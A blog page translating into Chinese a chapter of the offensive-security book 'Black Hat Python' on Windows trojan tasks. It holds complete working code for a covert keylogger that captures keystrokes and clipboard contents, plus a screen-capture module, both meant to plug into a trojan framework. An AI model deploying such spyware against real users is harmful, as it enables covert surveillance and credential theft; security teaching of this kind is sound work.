<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Black Hat Python 2nd 8 | Ma9icCR</title><meta name="description" content="COMMON TROJANING TASKS ON WINDOWS–WINDOWS上常见的特洛伊木马任务当您部署特洛伊木马时，您可能希望使用它执行一些常见的任务:抓取按键情况、截图和执行 shellcode ，以便为像 CANVAS 或 Metasploit 这样的工具提供交互式会话。本章重点介绍在Windows系统上执行这些任务。我们将使用一些沙盒检测技术来确定我们是否可以在防病毒或取证沙盒中运"><meta name="keywords" content="Black_Hat_Python_2nd"><meta name="author" content="Ma9icCR"><meta name="copyright" content="Ma9icCR"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://ma9iccr.github.io/2021-07/Black-Hat-Python-2nd-8/"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin="crossorigin"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta property="og:type" content="article"><meta property="og:title" content="Black Hat Python 2nd 8"><meta property="og:url" content="https://ma9iccr.github.io/2021-07/Black-Hat-Python-2nd-8/"><meta property="og:site_name" content="Ma9icCR"><meta property="og:description" content="COMMON TROJANING TASKS ON WINDOWS–WINDOWS上常见的特洛伊木马任务当您部署特洛伊木马时，您可能希望使用它执行一些常见的任务:抓取按键情况、截图和执行 shellcode ，以便为像 CANVAS 或 Metasploit 这样的工具提供交互式会话。本章重点介绍在Windows系统上执行这些任务。我们将使用一些沙盒检测技术来确定我们是否可以在防病毒或取证沙盒中运"><meta property="og:image" content="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg"><meta property="article:published_time" content="2021-07-13T08:11:49.000Z"><meta property="article:modified_time" content="2022-03-28T07:20:39.122Z"><meta name="twitter:card" content="summary"><script>var activateDarkMode = function () {
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null) {
    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#000')
  }
}
var activateLightMode = function () {
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null) {
    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#fff')
  }
}

var getCookies = function (name) {
  const value = `; ${document.cookie}`
  const parts = value.split(`; ${name}=`)
  if (parts.length === 2) return parts.pop().split(';').shift()
}

var autoChangeMode = 'false'
var t = getCookies('theme')
if (autoChangeMode === '1') {
  var isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
  var isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
  var isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

  if (t === undefined) {
    if (isLightMode) activateLightMode()
    else if (isDarkMode) activateDarkMode()
    else if (isNotSpecified || hasNoSupport) {
      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
      var now = new Date()
      var hour = now.getHours()
      var isNight = hour <= 6 || hour >= 18
      isNight ? activateDarkMode() : activateLightMode()
    }
    window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
      if (Cookies.get('theme') === undefined) {
        e.matches ? activateDarkMode() : activateLightMode()
      }
    })
  } else if (t === 'light') activateLightMode()
  else activateDarkMode()
} else if (autoChangeMode === '2') {
  now = new Date()
  hour = now.getHours()
  isNight = hour <= 6 || hour >= 18
  if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode()
} else {
  if (t === 'dark') activateDarkMode()
  else if (t === 'light') activateLightMode()
}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="prev" title="Black Hat Python 2nd 9" href="https://ma9iccr.github.io/2021-07/Black-Hat-Python-2nd-9/"><link rel="next" title="Black Hat Python 2nd 7" href="https://ma9iccr.github.io/2021-07/Black-Hat-Python-2nd-7/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  bookmark: {
    message_prev: '按',
    message_next: '键将本页加入书签'
  },
  runtime_unit: '天',
  runtime: true,
  copyright: undefined,
  ClickShowText: undefined,
  medium_zoom: false,
  fancybox: true,
  Snackbar: undefined,
  justifiedGallery: {
    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
  },
  baiduPush: false,
  highlightCopy: true,
  highlightLang: true,
  isPhotoFigcaption: false,
  islazyload: true,
  isanchor: false    
}</script><script>var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isSidebar: true,
  postUpdate: '2022-03-28 15:20:39'
}</script><noscript><style>
#nav {
  opacity: 1
}
.justified-gallery img{
  opacity: 1
}
</style></noscript><meta name="generator" content="Hexo 4.2.1"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">35</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">13</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">分类</div><div class="length_num">10</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down menus-expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li><li><a class="site-page" href="/images/"><i class="fa-fw fas fa-image"></i><span> Image</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/navigate/"><i class="fa-fw fas fa-navigate"></i><span> Navigate</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#COMMON-TROJANING-TASKS-ON-WINDOWS–WINDOWS上常见的特洛伊木马任务"><span class="toc-number">1.</span> <span class="toc-text">COMMON TROJANING TASKS ON WINDOWS–WINDOWS上常见的特洛伊木马任务</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#有趣的键盘记录"><span class="toc-number">1.1.</span> <span class="toc-text">有趣的键盘记录</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Kicking-the-Tires"><span class="toc-number">1.1.1.</span> <span class="toc-text">Kicking the Tires</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#捕捉屏幕截图"><span class="toc-number">1.2.</span> <span class="toc-text">捕捉屏幕截图</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pythonic-Shellcode-实现"><span class="toc-number">1.3.</span> <span class="toc-text">Pythonic Shellcode 实现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Kicking-the-Tires-1"><span class="toc-number">1.3.1.</span> <span class="toc-text">Kicking the Tires</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Sandbox-Detection–沙箱检测"><span class="toc-number">1.4.</span> <span class="toc-text">Sandbox Detection–沙箱检测</span></a></li></ol></li></ol></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg)"><nav id="nav"><span class="pull-left" id="blog_name"><a class="blog_title" id="site-name" href="/">Ma9icCR</a></span><span class="pull-right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down menus-expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li><li><a class="site-page" href="/images/"><i class="fa-fw fas fa-image"></i><span> Image</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/navigate/"><i class="fa-fw fas fa-navigate"></i><span> Navigate</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><span class="toggle-menu close"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">Black Hat Python 2nd 8</div></div><div id="post-meta"><div class="meta-firstline"><time class="post-meta__date"><span class="post-meta__date-created" title="发表于 2021-07-13 16:11:49"><i class="far fa-calendar-alt fa-fw"></i> 发表于 2021-07-13</span><span class="post-meta__separator">|</span><span class="post-meta__date-updated" title="更新于 2022-03-28 15:20:39"><i class="fas fa-history fa-fw"></i> 更新于 2022-03-28</span></time><span class="post-meta__categories"><span class="post-meta__separator">|</span><i class="fas fa-inbox fa-fw post-meta__icon"></i><a class="post-meta__categories" href="/categories/books/">books</a></span></div><div class="meta-secondline"> </div><div class="meta-thirdline"><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta__icon"></i><span>阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h1 id="COMMON-TROJANING-TASKS-ON-WINDOWS–WINDOWS上常见的特洛伊木马任务"><a href="#COMMON-TROJANING-TASKS-ON-WINDOWS–WINDOWS上常见的特洛伊木马任务" class="headerlink" title="COMMON TROJANING TASKS ON WINDOWS–WINDOWS上常见的特洛伊木马任务"></a>COMMON TROJANING TASKS ON WINDOWS–WINDOWS上常见的特洛伊木马任务</h1><p>当您部署特洛伊木马时，您可能希望使用它执行一些常见的任务:抓取按键情况、截图和执行 shellcode ，以便为像 CANVAS 或 Metasploit 这样的工具提供交互式会话。本章重点介绍在Windows系统上执行这些任务。我们将使用一些沙盒检测技术来确定我们是否可以在防病毒或取证沙盒中运行。这些模块将很容易修改，并且可以在第7章开发的特洛伊木马框架内工作。在后面的章节中，我们将探讨您可以使用特洛伊木马实现的提升权限技术。每种技术都有自己的挑战和被终端用户或防病毒解决方案发现的可能性。</p>
<p>我们建议您在植入特洛伊木马前，认真细心地模拟您的目标，以便您在活动目标上进行测试之前可以在实验室中测试模块。让我们从创建一个简单的键盘记录器开始。</p>
<h2 id="有趣的键盘记录"><a href="#有趣的键盘记录" class="headerlink" title="有趣的键盘记录"></a>有趣的键盘记录</h2><p><em>Keylogging</em> ，即使用隐藏程序来记录连续的击键，是本书中最古老的技巧之一，今天它仍然被用于各种级别的秘密行动中。攻击者仍然在使用它，因为它在捕获凭据或对话等敏感信息方面极其有效。</p>
<p>一个名为 <em>PyWinHook</em> 的优秀的 Python 库使我们能够轻松捕获所有键盘事件( <a href="https://pypi.org/project/pyWinhook/" target="_blank" rel="noopener">https://pypi.org/project/pyWinhook/</a> )。 <em>PyWinHook</em> 是原 <em>PyHook</em> 库的一个分支，经过更新后可以支持 Python 3。它利用了所在机器的 Windows 函数 <em>SetWindowsHookEx</em> ，该函数允许我们安装一个用户定义的函数来调用某些 Windows 事件。通过挂载键盘事件的 hook (钩子)，我们将能够捕获目标发出的所有按键。除此之外，我们还想知道他们执行这些击键的确切过程，这样我们就可以确定用户名、密码或其他有用信息何时被输入。</p>
<p>PyWinHook 为我们处理所有低层的编程，把按键记录器的核心功能逻辑留给我们。让我们打开 <em>keylogger.py</em> ，并看看它提供的一些管道:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> byref, create_string_buffer,  c_ulong, windll</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pythoncom</span><br><span class="line"><span class="keyword">import</span> pyWinhook <span class="keyword">as</span> pyHook</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> win32clipboard</span><br><span class="line">TIMEOUT = <span class="number">60</span>*<span class="number">10</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KeyLogger</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.current_window = <span class="literal">None</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_current_process</span><span class="params">(self)</span>:</span></span><br><span class="line">    [<span class="number">1</span>] hwnd = windll.user32.GetForegroundWindow()</span><br><span class="line">        pid = c_ulong(<span class="number">0</span>)</span><br><span class="line">    [<span class="number">2</span>] windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))</span><br><span class="line">        process_id = <span class="string">f'<span class="subst">&#123;pid.value&#125;</span>'</span></span><br><span class="line">        executable = create_string_buffer(<span class="number">512</span>)</span><br><span class="line">    [<span class="number">3</span>] h_process = windll.kernel32.OpenProcess(<span class="number">0x400</span>|<span class="number">0x10</span>, <span class="literal">False</span>, pid)</span><br><span class="line">    [<span class="number">4</span>] windll.psapi.GetModuleBaseNameA(</span><br><span class="line">                    h_process, <span class="literal">None</span>, byref(executable), <span class="number">512</span>)</span><br><span class="line">        window_title = create_string_buffer(<span class="number">512</span>)</span><br><span class="line">    [<span class="number">5</span>] windll.user32.GetWindowTextA(hwnd, byref(window_title), <span class="number">512</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                self.current_window = window_title.value.decode()</span><br><span class="line">            <span class="keyword">except</span> UnicodeDecodeError <span class="keyword">as</span> e:</span><br><span class="line">                print(<span class="string">f'<span class="subst">&#123;e&#125;</span>: window name unknown'</span>)</span><br><span class="line">        [<span class="number">6</span>] print(<span class="string">'\n'</span>, process_id,</span><br><span class="line">                 executable.value.decode(), self.current_window)</span><br><span class="line">            windll.kernel32.CloseHandle(hwnd)</span><br><span class="line">            windll.kernel32.CloseHandle(h_process)</span><br></pre></td></tr></table></figure>

<p>好的。我们定义了一个常量， <em>TIMEOUT</em> ，创建了一个新的类， <em>KeyLogger</em> ，并编写了 <em>get_current_process</em>  类函数来获取活跃窗口及其相关的 process ID (进程标识)。在该函数中，我们首先调用 GetForeGroundWindow [1]，它返回目标桌面上活跃窗口的句柄。接下来，我们将该句柄传递给 GetWindowThreadProcessId [2]函数，以检索窗口的进程标识。然后，我们打开进程[3]，并使用生成的进程句柄，找到流程的实际可执行名称[4]。最后一步是使用 GetWindowTextA [5]函数抓取窗口标题栏的全文。在这个辅助函数的最后，我们输出所有的信息[6]，这样您就可以清楚地看到哪些击键伴随着哪个进程和窗口。现在让我们把按键记录器的“肉”(功能函数)放在适当的位置来完成它:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mykeystroke</span><span class="params">(self, event)</span>:</span></span><br><span class="line">    [<span class="number">1</span>] <span class="keyword">if</span> event.WindowName != self.current_window:</span><br><span class="line">            self.get_current_process()</span><br><span class="line">    [<span class="number">2</span>] <span class="keyword">if</span> <span class="number">32</span> &lt; event.Ascii &lt; <span class="number">127</span>:</span><br><span class="line">            print(chr(event.Ascii), end=<span class="string">''</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">        [<span class="number">3</span>] <span class="keyword">if</span> event.Key == <span class="string">'V'</span>:</span><br><span class="line">                win32clipboard.OpenClipboard()</span><br><span class="line">                value = win32clipboard.GetClipboardData()</span><br><span class="line">                win32clipboard.CloseClipboard()</span><br><span class="line">                print(<span class="string">f'[PASTE] - <span class="subst">&#123;value&#125;</span>'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">f'<span class="subst">&#123;event.Key&#125;</span>'</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">()</span>:</span></span><br><span class="line">    save_stdout = sys.stdout</span><br><span class="line">    sys.stdout = StringIO()</span><br><span class="line">    kl = KeyLogger()</span><br><span class="line">[<span class="number">4</span>] hm = pyHook.HookManager()</span><br><span class="line">[<span class="number">5</span>] hm.KeyDown = kl.mykeystroke</span><br><span class="line">[<span class="number">6</span>] hm.HookKeyboard()</span><br><span class="line">    <span class="keyword">while</span> time.thread_time() &lt; TIMEOUT:</span><br><span class="line">        pythoncom.PumpWaitingMessages()</span><br><span class="line">    log = sys.stdout.getvalue()</span><br><span class="line">    sys.stdout = save_stdout</span><br><span class="line">    <span class="keyword">return</span> log</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(run())</span><br><span class="line">    print(<span class="string">'done.'</span>)</span><br></pre></td></tr></table></figure>

<p>让我们把它分解一下，从 <em>run</em> 函数开始。在第7章中，我们创建了脆弱目标可以运行的模块。每个模块都有一个名为 <em>run</em> 的入口函数，所以我们编写这个键盘记录程序也是遵循相同的模式，并且我们可以以相同的方式使用它。第7章的命令和控制系统中的 <em>run</em> 函数没有任何参数，并返回其输出。为了匹配这里的行为，我们暂时将 <em>stdout</em> 切换到一个类似文件的对象 <em>StringIO</em> 。现在，写入 stdout 的所有内容都将转到该对象，我们稍后将查询该对象。</p>
<p>切换 <em>stdout</em> 之后，我们创建了 <em>KeyLogger</em> 对象，并定义了 PyWinHook <em>HookManager</em> [4]。接下来，我们将 KeyDown 事件绑定到 KeyLogger 回调函数 <em>mykeystroke</em> [5]。然后，我们指示 PyWinHook 挂钩所有按键[6]，并继续执行，直到超时。每当目标按下键盘上的某个键时，我们的 <em>mykeystroke</em> 函数都会以事件对象作为参数进行调用。我们在 <em>mykeystroke</em> 中做的第一件事是检查用户是否更改了窗口[1]，如果是，我们获取新窗口的名称和进程信息。然后我们看一下发出的按键情况[2]，如果它在 ASCII 可打印范围内，我们就把它打印出来。如果它是一个修饰符(如 SHIFT 、 CTRL 或 ALT 键)或任何其他非标准按键，我们就从事件对象中获取键名。我们还检查用户是否正在执行粘贴操作[3]，如果是的话，我们转储剪贴板的内容。回调函数通过返回 True 来结束，以允许链中的下一个钩子(如果有的话)处理事件。我们去试试吧！</p>
<h3 id="Kicking-the-Tires"><a href="#Kicking-the-Tires" class="headerlink" title="Kicking the Tires"></a>Kicking the Tires</h3><p>测试我们的键盘记录器很容易。只需运行它，然后开始正常使用Windows。尝试使用网络浏览器、计算器或任何其他应用程序，然后在终端中查看结果:</p>
<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">tim</span>&gt;<span class="title">python</span> <span class="title">keylogger.py</span></span></span><br><span class="line"><span class="function"> 6852 <span class="title">WindowsTerminal.exe</span> <span class="title">Windows</span> <span class="title">PowerShell</span></span></span><br><span class="line"><span class="function"><span class="title">Return</span></span></span><br><span class="line"><span class="function"><span class="title">test</span></span></span><br><span class="line"><span class="function"><span class="title">Return</span></span></span><br><span class="line"><span class="function"> 18149 <span class="title">firefox.exe</span> <span class="title">Mozilla</span> <span class="title">Firefox</span></span></span><br><span class="line"><span class="function"><span class="title">nostarch.com</span></span></span><br><span class="line"><span class="function"><span class="title">Return</span></span></span><br><span class="line"><span class="function"> 5116 <span class="title">cmd.exe</span> <span class="title">Command</span> <span class="title">Prompt</span></span></span><br><span class="line"><span class="function"><span class="title">calc</span></span></span><br><span class="line"><span class="function"><span class="title">Return</span></span></span><br><span class="line"><span class="function"> 3004 <span class="title">ApplicationFrameHost.exe</span> <span class="title">Calculator</span></span></span><br><span class="line"><span class="function">1 <span class="title">Lshift</span></span></span><br><span class="line"><span class="function">+1</span></span><br><span class="line"><span class="function"><span class="title">Return</span></span></span><br></pre></td></tr></table></figure>

<p>您可以看到，我们在运行键盘记录脚本的主窗口中键入了 test 这个词。然后，我们启动了火狐浏览器，浏览了 nostarch.com ，并运行了一些其他应用程序。我们现在可以有把握地说，我们已经将我们的键盘记录器添加到了我们的特洛伊木马技巧包中！让我们继续做实现截图的任务。</p>
<h2 id="捕捉屏幕截图"><a href="#捕捉屏幕截图" class="headerlink" title="捕捉屏幕截图"></a>捕捉屏幕截图</h2><p>大多数恶意软件和渗透测试框架都包含对远程目标进行截屏的功能。这有助于捕获图像、视频帧或其他敏感数据，这些数据您可能无法通过数据包捕获或键盘记录器看到。幸运的是，我们可以使用 <em>pywin32</em> 包对所在机器的 Windows API 进行调用来获取它们。安装pip包:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pywin32</span><br></pre></td></tr></table></figure>

<p>截屏捕获器将使用 Windows 的 Graphics Device Interface (GDI，图形设备接口)来确定必要的属性，如屏幕总大小，并捕获图像。有些截屏软件只会抓取当前活动窗口或应用程序的截图，但我们会抓取整个屏幕。让我们开始吧。打开 <em>screenshotter.py</em> ，并输入以下代码:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> win32api</span><br><span class="line"><span class="keyword">import</span> win32con</span><br><span class="line"><span class="keyword">import</span> win32gui</span><br><span class="line"><span class="keyword">import</span> win32ui</span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>] <span class="function"><span class="keyword">def</span> <span class="title">get_dimensions</span><span class="params">()</span>:</span></span><br><span class="line">    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)</span><br><span class="line">    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)</span><br><span class="line">    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)</span><br><span class="line">    top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)</span><br><span class="line">    <span class="keyword">return</span> (width, height, left, top)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">screenshot</span><span class="params">(name=<span class="string">'screenshot'</span>)</span>:</span></span><br><span class="line">[<span class="number">2</span>] hdesktop = win32gui.GetDesktopWindow()</span><br><span class="line">    width, height, left, top = get_dimensions()</span><br><span class="line">[<span class="number">3</span>] desktop_dc = win32gui.GetWindowDC(hdesktop)</span><br><span class="line">    img_dc = win32ui.CreateDCFromHandle(desktop_dc)</span><br><span class="line">[<span class="number">4</span>] mem_dc = img_dc.CreateCompatibleDC()</span><br><span class="line">[<span class="number">5</span>] screenshot = win32ui.CreateBitmap()</span><br><span class="line">    screenshot.CreateCompatibleBitmap(img_dc, width, height)</span><br><span class="line">    mem_dc.SelectObject(screenshot)</span><br><span class="line">[<span class="number">6</span>] mem_dc.BitBlt((<span class="number">0</span>,<span class="number">0</span>), (width, height),</span><br><span class="line">                   img_dc, (left, top), win32con.SRCCOPY)</span><br><span class="line">[<span class="number">7</span>] screenshot.SaveBitmapFile(mem_dc, <span class="string">f'<span class="subst">&#123;name&#125;</span>.bmp'</span>)</span><br><span class="line">    mem_dc.DeleteDC()</span><br><span class="line">    win32gui.DeleteObject(screenshot.GetHandle())</span><br><span class="line"></span><br><span class="line">[<span class="number">8</span>] <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">()</span>:</span></span><br><span class="line">    screenshot()</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'screenshot.bmp'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        img = f.read()</span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    screenshot()</span><br></pre></td></tr></table></figure>

<p>让我们来回头看一下这个小脚本是做什么的。我们获得了整个桌面的句柄[2]，它包括多个显示器上的整个可视区域。然后，我们确定屏幕(或多个屏幕)的大小[1]，以便我们知道屏幕截图所需的尺寸。我们调用 <em>GetWindowDC</em> [3]函数创建一个设备上下文，并传入桌面的句柄。(在 <a href="https://docs.microsoft.com/" target="_blank" rel="noopener">Microsoft Developer Network [MSDN，微软开发者网络]</a> 上了解更多关于设备上下文和 GDI 编程的信息)。接下来，创建一个基于内存的设备上下文[4]，我们将在其中存储图像捕获，直到我们将位图字节写入文件。然后我们创建一个位图对象[5]，它被设置为我们桌面的设备上下文。然后， <em>SelectObject</em> 调用将基于内存的设备上下文设置为指向我们正在捕获的位图对象。我们使用 <em>BitBlt</em> [6]函数获取桌面图像的逐位副本，并将其存储在基于内存的上下文中。可以把这看作是对 GDI 对象的 <em>memcpy</em> 调用。最后一步是将此图像转储到磁盘[7]。</p>
